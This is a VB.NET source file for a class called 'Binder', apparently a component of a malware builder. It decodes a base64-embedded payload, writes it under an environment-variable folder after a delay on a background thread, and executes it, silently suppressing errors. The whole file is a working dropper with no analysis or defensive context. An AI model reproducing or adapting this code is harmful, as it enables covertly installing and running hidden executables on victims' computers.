Imports System.Diagnostics
Public Class Binder
    Public BinderBytes As String = ""
    Public DropperPath As String = ""
    Public BinderSleep As String = ""
    Public DropperName As String = ""
    Public Function StartBinder()
        Dim BinderThread As New Threading.Thread(AddressOf NewBinder)
        BinderThread.IsBackground = True
        BinderThread.Start()
        Return True
    End Function
    Public Function NewBinder()
        Try
            Threading.Thread.Sleep(BinderSleep)
            IO.File.WriteAllBytes(Environ(DropperPath) & "\" & DropperName, Convert.FromBase64String(BinderBytes))
            Process.Start(Environ(DropperPath) & "\" & DropperName)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
End Class
